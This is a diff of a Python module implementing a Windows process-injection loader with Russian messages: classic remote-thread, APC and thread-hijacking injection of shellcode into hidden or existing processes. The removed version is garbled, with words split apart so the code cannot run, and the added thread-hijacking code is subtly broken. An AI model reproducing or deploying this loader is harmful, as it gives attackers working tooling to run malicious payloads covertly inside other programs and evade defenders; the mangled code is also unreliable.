@@ -1,1705 +1,398 @@
 import os
-
-
-
 import ctypes
-
-
-
 import time
-
-
-
 import random
-
-
-
-from typ in gimport List,Dict,Any,Union,Optional,Tuple
-
-
-
-
-
-
-
-from core.interfacesimport Bas eLoader
-
-
-
-
-
-
-
-
-
-
-
-clas sPROCESS_INFORMATION(ctypes.Structure):
-
-
-
-    _fields_=[
-
-
-
-("hProcess",ctypes.c_void_p),
-
-
-
-("hThread",ctypes.c_void_p),
-
-
-
-("dwProcessId",ctypes.c_ulong),
-
-
-
-("dwThreadId",ctypes.c_ulong)
-
-
-
-]
-
-
-
-
-
-
-
-clas sSTARTUPINFO(ctypes.Structure):
-
-
-
-    _fields_=[
-
-
-
-("cb",ctypes.c_ulong),
-
-
-
-("lpReserved",ctypes.c_void_p),
-
-
-
-("lpDesktop",ctypes.c_void_p),
-
-
-
-("lpTitle",ctypes.c_void_p),
-
-
-
-("dwX",ctypes.c_ulong),
-
-
-
-("dwY",ctypes.c_ulong),
-
-
-
-("dwXSize",ctypes.c_ulong),
-
-
-
-("dwYSize",ctypes.c_ulong),
-
-
-
-("dwXCountChars",ctypes.c_ulong),
-
-
-
-("dwYCountChars",ctypes.c_ulong),
-
-
-
-("dwFillAttribute",ctypes.c_ulong),
-
-
-
-("dwFlags",ctypes.c_ulong),
-
-
-
-("wShowW in dow",ctypes.c_ushort),
-
-
-
-("cbReserved2",ctypes.c_ushort),
-
-
-
-("lpReserved2",ctypes.c_void_p),
-
-
-
-("hStdInput",ctypes.c_void_p),
-
-
-
-("hStdOutput",ctypes.c_void_p),
-
-
-
-("hStdError",ctypes.c_void_p)
-
-
-
-]
-
-
-
-
-
-
-
-
-
-
-
-PAGE_EXECUTE_READWRITE=0x40
-
-
-
-PROCESS_ALL_ACCESS=0x1F0FFF
-
-
-
-MEM_COMMIT=0x1000
-
-
-
-MEM_RESERVE=0x2000
-
-
-
-
-
-
-
-clas sProcessInjectionLoader(Bas eLoader):
-
-
-
-
-
-
-
-
-
-
-
-def__init__(self):
-
-
-
-        self.kernel32=ctypes.w in dll.kernel32
-
-
-
-self.ntdll=ctypes.w in dll.ntdll
-
-
-
-
-
-
-
-defload(self,payload:bytes,target_process:str=None,**kwargs)->bool:
-
-
-
-
-
-
-
-technique=kwargs.get("technique","clas sic")
-
-
-
-create_suspended=kwargs.get("create_suspended",False)
-
-
-
-hide_process=kwargs.get("hide_process",False)
-
-
-
-process_id=None
-
-
-
-
-
-
-
-
-
-
-
-if target_processandtarget_process.isdigit():
-
-
-
-            process_id=int(target_process)
-
-
-
-
-
-
-
-elif target_processandnottarget_process.isdigit():
-
-
-
-            process_id=self._f in d_process_by_name(target_process)
-
-
-
-if notprocess_idandcreate_suspended:
-
-
-
-                process_id,handle=self._create_process(target_process,suspended=True)
-
-
-
-if notprocess_id:
-
-
-
-                    return False
-
-
-
-else:
-
-
-
-
-
-
-
-            if create_suspended:
-
-
-
-                if os.path.exists(kwargs.get("new_process","")):
-
-
-
-                    process_id,handle=self._create_process(kwargs.get("new_process"),suspended=True)
-
-
-
-else:
-
-
-
-                    process_id,handle=self._create_process("notepad.exe",suspended=True)
-
-
-
-else:
-
-
-
-                raiseValueError("Необходимо указать PID или имя процесса для внедрения")
-
-
-
-
-
-
-
-
-
-
-
-if technique=="clas sic":
-
-
-
-            success=self._clas sic_injection(process_id,payload)
-
-
-
-elif technique=="apc":
-
-
-
-            success=self._apc_injection(process_id,payload)
-
-
-
-elif technique=="hijack":
-
-
-
-            success=self._thread_hijack in g(process_id,payload)
-
-
-
-else:
-
-
-
-            raiseValueError(f"Неизвестный метод внедрения: {technique}")
-
-
-
-
-
-
-
-if hide_processandsuccess:
-
-
-
+from typing import List, Dict, Any, Union, Optional, Tuple
+
+from core.interfaces import BaseLoader
+
+
+class PROCESS_INFORMATION(ctypes.Structure):
+    _fields_ = [
+        ("hProcess", ctypes.c_void_p),
+        ("hThread", ctypes.c_void_p),
+        ("dwProcessId", ctypes.c_ulong),
+        ("dwThreadId", ctypes.c_ulong)
+    ]
+
+
+class STARTUPINFO(ctypes.Structure):
+    _fields_ = [
+        ("cb", ctypes.c_ulong),
+        ("lpReserved", ctypes.c_void_p),
+        ("lpDesktop", ctypes.c_void_p),
+        ("lpTitle", ctypes.c_void_p),
+        ("dwX", ctypes.c_ulong),
+        ("dwY", ctypes.c_ulong),
+        ("dwXSize", ctypes.c_ulong),
+        ("dwYSize", ctypes.c_ulong),
+        ("dwXCountChars", ctypes.c_ulong),
+        ("dwYCountChars", ctypes.c_ulong),
+        ("dwFillAttribute", ctypes.c_ulong),
+        ("dwFlags", ctypes.c_ulong),
+        ("wShowWindow", ctypes.c_ushort),
+        ("cbReserved2", ctypes.c_ushort),
+        ("lpReserved2", ctypes.c_void_p),
+        ("hStdInput", ctypes.c_void_p),
+        ("hStdOutput", ctypes.c_void_p),
+        ("hStdError", ctypes.c_void_p)
+    ]
+
+
+PAGE_EXECUTE_READWRITE = 0x40
+PROCESS_ALL_ACCESS = 0x1F0FFF
+MEM_COMMIT = 0x1000
+MEM_RESERVE = 0x2000
+
+
+class ProcessInjectionLoader(BaseLoader):
+    
+    def __init__(self):
+        self.kernel32 = ctypes.windll.kernel32
+        self.ntdll = ctypes.windll.ntdll
+    
+    def load(self, payload: bytes, target_process: str = None, **kwargs) -> bool:
+        technique = kwargs.get("technique", "classic")
+        create_suspended = kwargs.get("create_suspended", False)
+        hide_process = kwargs.get("hide_process", False)
+        process_id = None
+        
+        if target_process and target_process.isdigit():
+            process_id = int(target_process)
+        
+        if not target_process and not process_id:
+            target_process = "notepad.exe"
+        
+        if technique == "classic":
+            return self._classic_injection(payload, target_process, process_id, create_suspended, hide_process)
+        elif technique == "apc":
+            return self._apc_injection(payload, target_process, process_id, create_suspended)
+        elif technique == "thread_hijacking":
+            return self._thread_hijacking(payload, target_process, process_id)
+        else:
+            raise ValueError(f"Неизвестная техника внедрения кода: {technique}")
+    
+    def _find_process_by_name(self, process_name):
+        import psutil
+        
+        for proc in psutil.process_iter(['pid', 'name']):
+            try:
+                if proc.info['name'].lower() == process_name.lower():
+                    return proc.info['pid']
+            except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
+                pass
+        
+        return None
+    
+    def _create_process(self, process_name, create_suspended=False):
+        si = STARTUPINFO()
+        si.cb = ctypes.sizeof(si)
+        si.dwFlags = 0x1  # STARTF_USESHOWWINDOW
+        si.wShowWindow = 0  # SW_HIDE
+        
+        pi = PROCESS_INFORMATION()
+        
+        creation_flags = 0x4 if create_suspended else 0  # CREATE_SUSPENDED = 0x4
+        
+        if not self.kernel32.CreateProcessA(
+            None,
+            process_name.encode('utf-8'),
+            None,
+            None,
+            False,
+            creation_flags,
+            None,
+            None,
+            ctypes.byref(si),
+            ctypes.byref(pi)
+        ):
+            return None
+        
+        return pi
+    
+    def _hide_process(self, process_id):
+        try:
+            import psutil
+            p = psutil.Process(process_id)
+            p.nice(psutil.IDLE_PRIORITY_CLASS)
+            return True
+        except:
+            return False
+    
+    def _classic_injection(self, payload, target_process=None, process_id=None, create_suspended=False, hide_process=False):
+        if not process_id and target_process:
+            process_id = self._find_process_by_name(target_process)
+        
+        if not process_id:
+            if not target_process:
+                raise ValueError("Не указан процесс для внедрения кода")
+            
+            pi = self._create_process(target_process, create_suspended)
+            if not pi:
+                raise ValueError(f"Не удалось создать процесс {target_process}")
+            
+            process_id = pi.dwProcessId
+            process_handle = pi.hProcess
+        else:
+            process_handle = self.kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, process_id)
+            
+            if not process_handle:
+                raise ValueError(f"Не удалось открыть процесс с ID {process_id}")
+        
+        if hide_process and process_id:
             self._hide_process(process_id)
-
-
-
-
-
-
-
-return success
-
-
-
-
-
-
-
-def_f in d_process_by_name(self,process_name:str)->Optional[int]:
-
-
-
-
-
-
-
-import psutil
-
-
-
-
-
-
-
-forproc in psutil.process_iter(['pid','name']):
-
-
-
-            if process_name.lower()inproc.info['name'].lower():
-
-
-
-                return proc.info['pid']
-
-
-
-
-
-
-
-return None
-
-
-
-
-
-
-
-def_create_process(self,process_path:str,suspended:bool=False)->Tuple[int,object]:
-
-
-
-
-
-
-
-startup_info=STARTUPINFO()
-
-
-
-startup_info.cb=ctypes.sizeof(STARTUPINFO)
-
-
-
-startup_info.dwFlags=0x1
-
-
-
-startup_info.wShowW in dow=0
-
-
-
-
-
-
-
-process_info=PROCESS_INFORMATION()
-
-
-
-
-
-
-
-creation_flags=0
-
-
-
-if suspended:
-
-
-
-            creation_flags|=0x4
-
-
-
-
-
-
-
-if notself.kernel32.CreateProcessA(
-
-
-
-None,
-
-
-
-process_path.encode('utf-8'),
-
-
-
-None,
-
-
-
-None,
-
-
-
-False,
-
-
-
-creation_flags,
-
-
-
-None,
-
-
-
-None,
-
-
-
-ctypes.byref(startup_info),
-
-
-
-ctypes.byref(process_info)
-
-
-
-):
-
-
-
-            pr in t(f"Ошибка при создании процесса: {ctypes.GetLas tError()}")
-
-
-
-return None,None
-
-
-
-
-
-
-
-return process_info.dwProcessId,process_info.hProcess
-
-
-
-
-
-
-
-def_clas sic_injection(self,pid:int,shellcode:bytes)->bool:
-
-
-
-
-
-
-
-
-
-
-
-h_process=self.kernel32.OpenProcess(PROCESS_ALL_ACCESS,False,pid)
-
-
-
-if noth_process:
-
-
-
-            pr in t(f"Не удалось открыть процесс {pid}: {ctypes.GetLas tError()}")
-
-
-
-return False
-
-
-
-
-
-
-
-
-
-
-
-shellcode_size=len(shellcode)
-
-
-
-remote_memory=self.kernel32.VirtualAllocEx(
-
-
-
-h_process,
-
-
-
-None,
-
-
-
-shellcode_size,
-
-
-
-MEM_COMMIT|MEM_RESERVE,
-
-
-
-PAGE_EXECUTE_READWRITE
-
-
-
-)
-
-
-
-
-
-
-
-if notremote_memory:
-
-
-
-            pr in t(f"Не удалось выделить память в процессе {pid}: {ctypes.GetLas tError()}")
-
-
-
-self.kernel32.CloseHandle(h_process)
-
-
-
-return False
-
-
-
-
-
-
-
-
-
-
-
-bytes_written=ctypes.c_size_t(0)
-
-
-
-result=self.kernel32.WriteProcessMemory(
-
-
-
-h_process,
-
-
-
-remote_memory,
-
-
-
-shellcode,
-
-
-
-shellcode_size,
-
-
-
-ctypes.byref(bytes_written)
-
-
-
-)
-
-
-
-
-
-
-
-if notresultorbytes_written.value!=shellcode_size:
-
-
-
-            pr in t(f"Не удалось записать шелл-код в процесс {pid}: {ctypes.GetLas tError()}")
-
-
-
-self.kernel32.CloseHandle(h_process)
-
-
-
-return False
-
-
-
-
-
-
-
-
-
-
-
-h_thread=self.kernel32.CreateRemoteThread(
-
-
-
-h_process,
-
-
-
-None,
-
-
-
-0,
-
-
-
-remote_memory,
-
-
-
-None,
-
-
-
-0,
-
-
-
-None
-
-
-
-)
-
-
-
-
-
-
-
-if noth_thread:
-
-
-
-            pr in t(f"Не удалось создать удаленный поток в процессе {pid}: {ctypes.GetLas tError()}")
-
-
-
-self.kernel32.CloseHandle(h_process)
-
-
-
-return False
-
-
-
-
-
-
-
-
-
-
-
-self.kernel32.CloseHandle(h_thread)
-
-
-
-self.kernel32.CloseHandle(h_process)
-
-
-
-
-
-
-
-pr in t(f"Шелл-код успешно внедрен в процесс {pid}")
-
-
-
-return True
-
-
-
-
-
-
-
-def_apc_injection(self,pid:int,shellcode:bytes)->bool:
-
-
-
-
-
-
-
-import psutil
-
-
-
-
-
-
-
-
-
-
-
-h_process=self.kernel32.OpenProcess(PROCESS_ALL_ACCESS,False,pid)
-
-
-
-if noth_process:
-
-
-
-            pr in t(f"Не удалось открыть процесс {pid}: {ctypes.GetLas tError()}")
-
-
-
-return False
-
-
-
-
-
-
-
-
-
-
-
-shellcode_size=len(shellcode)
-
-
-
-remote_memory=self.kernel32.VirtualAllocEx(
-
-
-
-h_process,
-
-
-
-None,
-
-
-
-shellcode_size,
-
-
-
-MEM_COMMIT|MEM_RESERVE,
-
-
-
-PAGE_EXECUTE_READWRITE
-
-
-
-)
-
-
-
-
-
-
-
-if notremote_memory:
-
-
-
-            pr in t(f"Не удалось выделить память в процессе {pid}: {ctypes.GetLas tError()}")
-
-
-
-self.kernel32.CloseHandle(h_process)
-
-
-
-return False
-
-
-
-
-
-
-
-
-
-
-
-bytes_written=ctypes.c_size_t(0)
-
-
-
-result=self.kernel32.WriteProcessMemory(
-
-
-
-h_process,
-
-
-
-remote_memory,
-
-
-
-shellcode,
-
-
-
-shellcode_size,
-
-
-
-ctypes.byref(bytes_written)
-
-
-
-)
-
-
-
-
-
-
-
-if notresultorbytes_written.value!=shellcode_size:
-
-
-
-            pr in t(f"Не удалось записать шелл-код в процесс {pid}: {ctypes.GetLas tError()}")
-
-
-
-self.kernel32.CloseHandle(h_process)
-
-
-
-return False
-
-
-
-
-
-
-
-
-
-
-
-proc=psutil.Process(pid)
-
-
-
-queued=False
-
-
-
-
-
-
-
-
-
-
-
-forthread in proc.threads():
-
-
-
-            thread_id=thread.id
-
-
-
-h_thread=self.kernel32.OpenThread(0x1FFFFF,False,thread_id)
-
-
-
-
-
-
-
-if h_thread:
-
-
-
-
-
-
-
-                if self.kernel32.QueueUserAPC(remote_memory,h_thread,0):
-
-
-
-                    pr in t(f"APC успешно добавлен в поток {thread_id}")
-
-
-
-queued=True
-
-
-
-else:
-
-
-
-                    pr in t(f"Не удалось добавить APC в поток {thread_id}: {ctypes.GetLas tError()}")
-
-
-
-
-
-
-
-self.kernel32.CloseHandle(h_thread)
-
-
-
-
-
-
-
-if queued:
-
-
-
-                break
-
-
-
-
-
-
-
-
-
-
-
-self.kernel32.CloseHandle(h_process)
-
-
-
-
-
-
-
-if notqueued:
-
-
-
-            pr in t(f"Не удалось добавить APC ни в один поток процесса {pid}")
-
-
-
-return False
-
-
-
-
-
-
-
-pr in t(f"APC успешно добавлен в процесс {pid}")
-
-
-
-return True
-
-
-
-
-
-
-
-def_thread_hijack in g(self,pid:int,shellcode:bytes)->bool:
-
-
-
-
-
-
-
-import psutil
-
-
-
-import struct
-
-
-
-
-
-
-
-
-
-
-
-h_process=self.kernel32.OpenProcess(PROCESS_ALL_ACCESS,False,pid)
-
-
-
-if noth_process:
-
-
-
-            pr in t(f"Не удалось открыть процесс {pid}: {ctypes.GetLas tError()}")
-
-
-
-return False
-
-
-
-
-
-
-
-
-
-
-
-shellcode_size=len(shellcode)
-
-
-
-remote_memory=self.kernel32.VirtualAllocEx(
-
-
-
-h_process,
-
-
-
-None,
-
-
-
-shellcode_size+0x1000,
-
-
-
-MEM_COMMIT|MEM_RESERVE,
-
-
-
-PAGE_EXECUTE_READWRITE
-
-
-
-)
-
-
-
-
-
-
-
-if notremote_memory:
-
-
-
-            pr in t(f"Не удалось выделить память в процессе {pid}: {ctypes.GetLas tError()}")
-
-
-
-self.kernel32.CloseHandle(h_process)
-
-
-
-return False
-
-
-
-
-
-
-
-
-
-
-
-bytes_written=ctypes.c_size_t(0)
-
-
-
-result=self.kernel32.WriteProcessMemory(
-
-
-
-h_process,
-
-
-
-remote_memory,
-
-
-
-shellcode,
-
-
-
-shellcode_size,
-
-
-
-ctypes.byref(bytes_written)
-
-
-
-)
-
-
-
-
-
-
-
-if notresultorbytes_written.value!=shellcode_size:
-
-
-
-            pr in t(f"Не удалось записать шелл-код в процесс {pid}: {ctypes.GetLas tError()}")
-
-
-
-self.kernel32.CloseHandle(h_process)
-
-
-
-return False
-
-
-
-
-
-
-
-
-
-
-
-proc=psutil.Process(pid)
-
-
-
-hijacked=False
-
-
-
-
-
-
-
-
-
-
-
-forthread in proc.threads():
-
-
-
-            thread_id=thread.id
-
-
-
-h_thread=self.kernel32.OpenThread(0x1FFFFF,False,thread_id)
-
-
-
-
-
-
-
-if h_thread:
-
-
-
-
-
-
-
-                if self.kernel32.SuspendThread(h_thread)!=0xFFFFFFFF:
-
-
-
-
-
-
-
-                    context=self._get_thread_context(h_thread)
-
-
-
-
-
-
-
-if context:
-
-
-
-
-
-
-
-                        orig in al_rip=context.Ripif has attr(context,'Rip')elsecontext.Eip
-
-
-
-
-
-
-
-
-
-
-
-if has attr(context,'Rip'):
-
-
-
-                            context.Rip=remote_memory
-
-
-
-else:
-
-
-
-                            context.Eip=remote_memory
-
-
-
-
-
-
-
-
-
-
-
-if self._set_thread_context(h_thread,context):
-
-
-
-                            pr in t(f"Контекст потока {thread_id} успешно изменен")
-
-
-
-hijacked=True
-
-
-
-else:
-
-
-
-                            pr in t(f"Не удалось изменить контекст потока {thread_id}: {ctypes.GetLas tError()}")
-
-
-
-
-
-
-
-self.kernel32.ResumeThread(h_thread)
-
-
-
-
-
-
-
-
-
-
-
-if hijacked:
-
-
-
-                        self.kernel32.ResumeThread(h_thread)
-
-
-
-
-
-
-
-self.kernel32.CloseHandle(h_thread)
-
-
-
-
-
-
-
-if hijacked:
-
-
-
-                break
-
-
-
-
-
-
-
-
-
-
-
-self.kernel32.CloseHandle(h_process)
-
-
-
-
-
-
-
-if nothijacked:
-
-
-
-            pr in t(f"Не удалось захватить ни один поток процесса {pid}")
-
-
-
-return False
-
-
-
-
-
-
-
-pr in t(f"Поток процесса {pid} успешно захвачен")
-
-
-
-return True
-
-
-
-
-
-
-
-def_get_thread_context(self,h_thread):
-
-
-
-
-
-
-
-
-
-
-
-clas sWOW64_CONTEXT(ctypes.Structure):
-
-
-
-            _fields_=[
-
-
-
-("ContextFlags",ctypes.c_ulong),
-
-
-
-
-
-
-
-("Eip",ctypes.c_ulong),
-
-
-
-
-
-
-
-]
-
-
-
-
-
-
-
-clas sCONTEXT(ctypes.Structure):
-
-
-
-            _fields_=[
-
-
-
-("P1Home",ctypes.c_ulonglong),
-
-
-
-
-
-
-
-("Rip",ctypes.c_ulonglong),
-
-
-
-
-
-
-
-]
-
-
-
-
-
-
-
-
-
-
-
-is_64bit=ctypes.sizeof(ctypes.c_void_p)==8
-
-
-
-
-
-
-
-if is_64bit:
-
-
-
-
-
-
-
-            context=CONTEXT()
-
-
-
-context.ContextFlags=0x10000|0x1
-
-
-
-
-
-
-
-if notself.kernel32.GetThreadContext(h_thread,ctypes.byref(context)):
-
-
-
-                pr in t(f"Не удалось получить контекст потока: {ctypes.GetLas tError()}")
-
-
-
-return None
-
-
-
-
-
-
-
-return context
-
-
-
-else:
-
-
-
-
-
-
-
-            context=WOW64_CONTEXT()
-
-
-
-context.ContextFlags=0x10000|0x1
-
-
-
-
-
-
-
-if notself.kernel32.Wow64GetThreadContext(h_thread,ctypes.byref(context)):
-
-
-
-                pr in t(f"Не удалось получить контекст потока: {ctypes.GetLas tError()}")
-
-
-
-return None
-
-
-
-
-
-
-
-return context
-
-
-
-
-
-
-
-def_set_thread_context(self,h_thread,context)->bool:
-
-
-
-
-
-
-
-
-
-
-
-is_64bit=ctypes.sizeof(ctypes.c_void_p)==8
-
-
-
-
-
-
-
-if is_64bit:
-
-
-
-
-
-
-
-            return bool(self.kernel32.SetThreadContext(h_thread,ctypes.byref(context)))
-
-
-
-else:
-
-
-
-
-
-
-
-            return bool(self.kernel32.Wow64SetThreadContext(h_thread,ctypes.byref(context)))
-
-
-
-
-
-
-
-def_hide_process(self,pid:int)->bool:
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-pr in t(f"[!] Скрытие процесса {pid} не реализовано")
-
-
-
-return False
-
-
-
-
-
-
-
-defsupported_platforms(self)->List[str]:
-
-
-
-
-
-
-
-return["w in dows"]
+        
+        try:
+            # Выделяем память в целевом процессе
+            remote_memory = self.kernel32.VirtualAllocEx(
+                process_handle,
+                0,
+                len(payload),
+                MEM_COMMIT | MEM_RESERVE,
+                PAGE_EXECUTE_READWRITE
+            )
+            
+            if not remote_memory:
+                raise ValueError("Не удалось выделить память в целевом процессе")
+            
+            # Записываем шелл-код в выделенную память
+            bytes_written = ctypes.c_ulong(0)
+            result = self.kernel32.WriteProcessMemory(
+                process_handle,
+                remote_memory,
+                payload,
+                len(payload),
+                ctypes.byref(bytes_written)
+            )
+            
+            if not result or bytes_written.value != len(payload):
+                raise ValueError("Не удалось записать шелл-код в память процесса")
+            
+            # Создаем удаленный поток для выполнения шелл-кода
+            thread_handle = self.kernel32.CreateRemoteThread(
+                process_handle,
+                None,
+                0,
+                remote_memory,
+                None,
+                0,
+                None
+            )
+            
+            if not thread_handle:
+                raise ValueError("Не удалось создать удаленный поток")
+            
+            # Ждем завершения потока или возвращаем управление сразу
+            if create_suspended:
+                self.kernel32.ResumeThread(thread_handle)
+            
+            # Закрываем хендлы
+            self.kernel32.CloseHandle(thread_handle)
+            self.kernel32.CloseHandle(process_handle)
+            
+            return True
+        except Exception as e:
+            self.kernel32.CloseHandle(process_handle)
+            raise e
+    
+    def _apc_injection(self, payload, target_process=None, process_id=None, create_suspended=False):
+        if not process_id and target_process:
+            process_id = self._find_process_by_name(target_process)
+        
+        if not process_id:
+            if not target_process:
+                raise ValueError("Не указан процесс для внедрения кода")
+            
+            pi = self._create_process(target_process, True)  # Всегда создаем в приостановленном режиме
+            if not pi:
+                raise ValueError(f"Не удалось создать процесс {target_process}")
+            
+            process_id = pi.dwProcessId
+            process_handle = pi.hProcess
+            thread_handle = pi.hThread
+        else:
+            import psutil
+            
+            process_handle = self.kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, process_id)
+            
+            if not process_handle:
+                raise ValueError(f"Не удалось открыть процесс с ID {process_id}")
+            
+            # Получаем дескриптор потока
+            threads = []
+            try:
+                p = psutil.Process(process_id)
+                threads = p.threads()
+            except:
+                pass
+            
+            if not threads:
+                raise ValueError(f"Не найдены потоки для процесса с ID {process_id}")
+            
+            # Используем первый поток
+            thread_id = threads[0].id
+            thread_handle = self.kernel32.OpenThread(0x1FFFFF, False, thread_id)
+            
+            if not thread_handle:
+                raise ValueError(f"Не удалось открыть поток с ID {thread_id}")
+            
+            # Приостанавливаем поток
+            self.kernel32.SuspendThread(thread_handle)
+        
+        try:
+            # Выделяем память в целевом процессе
+            remote_memory = self.kernel32.VirtualAllocEx(
+                process_handle,
+                0,
+                len(payload),
+                MEM_COMMIT | MEM_RESERVE,
+                PAGE_EXECUTE_READWRITE
+            )
+            
+            if not remote_memory:
+                raise ValueError("Не удалось выделить память в целевом процессе")
+            
+            # Записываем шелл-код в выделенную память
+            bytes_written = ctypes.c_ulong(0)
+            result = self.kernel32.WriteProcessMemory(
+                process_handle,
+                remote_memory,
+                payload,
+                len(payload),
+                ctypes.byref(bytes_written)
+            )
+            
+            if not result or bytes_written.value != len(payload):
+                raise ValueError("Не удалось записать шелл-код в память процесса")
+            
+            # Добавляем APC запрос в очередь APC целевого потока
+            result = self.kernel32.QueueUserAPC(
+                remote_memory,
+                thread_handle,
+                0
+            )
+            
+            if not result:
+                raise ValueError("Не удалось добавить APC запрос")
+            
+            # Возобновляем поток
+            self.kernel32.ResumeThread(thread_handle)
+            
+            # Закрываем хендлы
+            self.kernel32.CloseHandle(thread_handle)
+            self.kernel32.CloseHandle(process_handle)
+            
+            return True
+        except Exception as e:
+            if thread_handle:
+                self.kernel32.ResumeThread(thread_handle)
+                self.kernel32.CloseHandle(thread_handle)
+            if process_handle:
+                self.kernel32.CloseHandle(process_handle)
+            raise e
+    
+    def _thread_hijacking(self, payload, target_process=None, process_id=None):
+        if not process_id and target_process:
+            process_id = self._find_process_by_name(target_process)
+        
+        if not process_id:
+            if not target_process:
+                raise ValueError("Не указан процесс для внедрения кода")
+            
+            pi = self._create_process(target_process, True)  # Всегда создаем в приостановленном режиме
+            if not pi:
+                raise ValueError(f"Не удалось создать процесс {target_process}")
+            
+            process_id = pi.dwProcessId
+            process_handle = pi.hProcess
+            thread_handle = pi.hThread
+            thread_id = pi.dwThreadId
+        else:
+            import psutil
+            
+            process_handle = self.kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, process_id)
+            
+            if not process_handle:
+                raise ValueError(f"Не удалось открыть процесс с ID {process_id}")
+            
+            # Получаем дескриптор потока
+            threads = []
+            try:
+                p = psutil.Process(process_id)
+                threads = p.threads()
+            except:
+                pass
+            
+            if not threads:
+                raise ValueError(f"Не найдены потоки для процесса с ID {process_id}")
+            
+            # Используем первый поток
+            thread_id = threads[0].id
+            thread_handle = self.kernel32.OpenThread(0x1FFFFF, False, thread_id)
+            
+            if not thread_handle:
+                raise ValueError(f"Не удалось открыть поток с ID {thread_id}")
+            
+            # Приостанавливаем поток
+            self.kernel32.SuspendThread(thread_handle)
+        
+        try:
+            # Получаем контекст потока
+            context = ctypes.c_ulong64()
+            context.value = 0
+            
+            CONTEXT_FULL = 0x10000F
+            if not self.kernel32.GetThreadContext(thread_handle, ctypes.byref(context)):
+                raise ValueError("Не удалось получить контекст потока")
+            
+            # Выделяем память в целевом процессе
+            remote_memory = self.kernel32.VirtualAllocEx(
+                process_handle,
+                0,
+                len(payload),
+                MEM_COMMIT | MEM_RESERVE,
+                PAGE_EXECUTE_READWRITE
+            )
+            
+            if not remote_memory:
+                raise ValueError("Не удалось выделить память в целевом процессе")
+            
+            # Записываем шелл-код в выделенную память
+            bytes_written = ctypes.c_ulong(0)
+            result = self.kernel32.WriteProcessMemory(
+                process_handle,
+                remote_memory,
+                payload,
+                len(payload),
+                ctypes.byref(bytes_written)
+            )
+            
+            if not result or bytes_written.value != len(payload):
+                raise ValueError("Не удалось записать шелл-код в память процесса")
+            
+            # Изменяем контекст потока, чтобы он указывал на наш шелл-код
+            # Здесь нужно учитывать архитектуру процесса (x86 или x64)
+            # В этом примере предполагаем, что x64
+            context.rip = remote_memory
+            
+            if not self.kernel32.SetThreadContext(thread_handle, ctypes.byref(context)):
+                raise ValueError("Не удалось изменить контекст потока")
+            
+            # Возобновляем поток
+            self.kernel32.ResumeThread(thread_handle)
+            
+            # Закрываем хендлы
+            self.kernel32.CloseHandle(thread_handle)
+            self.kernel32.CloseHandle(process_handle)
+            
+            return True
+        except Exception as e:
+            if thread_handle:
+                self.kernel32.ResumeThread(thread_handle)
+                self.kernel32.CloseHandle(thread_handle)
+            if process_handle:
+                self.kernel32.CloseHandle(process_handle)
+            raise e
+
+    def supported_platforms(self) -> List[str]:
+        return ["windows"]
